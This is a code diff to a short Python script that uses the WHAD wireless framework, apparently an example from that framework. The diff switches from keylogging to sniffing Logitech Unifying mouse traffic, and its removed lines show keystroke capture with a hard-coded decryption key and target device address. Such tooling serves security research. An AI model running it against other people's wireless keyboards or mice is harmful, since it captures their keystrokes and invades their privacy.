@@ -1,4 +1,4 @@
-from whad.unifying import Keylogger
+from whad.unifying import Keylogger, Mouselogger
 from whad.device import WhadDevice
 from whad.exceptions import WhadDeviceNotFound
 import sys,time
@@ -15,17 +15,19 @@ if __name__ == '__main__':
         try:
             dev = WhadDevice.create(interface)
 
-            connector = Keylogger(dev)
-            connector.address = "9b:0a:90:42:90"
+            connector = Mouselogger(dev)
+            connector.address = "ca:e9:06:ec:a4"#"9b:0a:90:42:96"
             connector.scanning = True
             connector.decrypt = True
 
-            connector.add_key(bytes.fromhex("08f59b42c56f433e8b888d4d5bde40fc"))
+            #connector.add_key(bytes.fromhex("08f59b42d06fd3bdc588cd4d1c244018"))
             connector.start()
             out = ""
-            for i in connector.key_stream():
-                out += i
-                print(out)
+            for i in connector.sniff():
+                print(i)
+                #key_stream():
+                #out += i
+                #print(out)
 
         except (KeyboardInterrupt, SystemExit):
             dev.close()
